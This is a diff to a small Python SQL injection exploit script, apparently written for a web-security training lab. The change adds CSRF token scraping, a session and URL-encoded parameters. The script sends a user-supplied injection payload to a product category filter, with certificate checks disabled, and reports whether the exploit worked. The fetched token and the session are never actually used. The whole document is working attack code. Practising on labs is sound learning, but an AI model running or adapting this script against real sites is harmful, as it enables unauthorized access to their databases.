@@ -1,8 +1,8 @@
 import sys
 
 import requests
-
 import urllib3
+from bs4 import BeautifulSoup
 
 urllib3.disable_warnings()
 
@@ -11,10 +11,19 @@ urllib3.disable_warnings()
 proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 
-def exploit_sqli(base_url, payload_entered):
-    uri = f"/filter?category={payload_entered}"
-    # in this way the payload_enetered is not encoded
-    r = requests.get(base_url + uri, proxies=proxies, verify=False, timeout=5)
+def get_csrf_token(session, base_url):
+    r = session.get(base_url, proxies=proxies, verify=False, timeout=5)
+    soup = BeautifulSoup(r.text, "html.parser")
+    csrf = soup.find("input")["value"]
+    return csrf
+
+
+def exploit_sqli(session, base_url, payload_entered):
+    # this time we want to URL encode the params:
+    crf = get_csrf_token(session, base_url)
+    params = {"category": payload_entered}
+
+    r = requests.get(base_url, params=params, proxies=proxies, verify=False, timeout=5)
     print(r.text)
     if "Waterproof Tea Bags" in r.text:
         return True
@@ -31,7 +40,9 @@ if __name__ == "__main__":
         print(f'[-] Example: {sys.argv[0]} www.google.com" "1=1"')
         sys.exit(-1)
 
-    if exploit_sqli(url, payload):
+    s = requests.Session()
+
+    if exploit_sqli(s, url, payload):
         print("[+] Exploit successful")
     else:
         print("[-] Exploit failed")
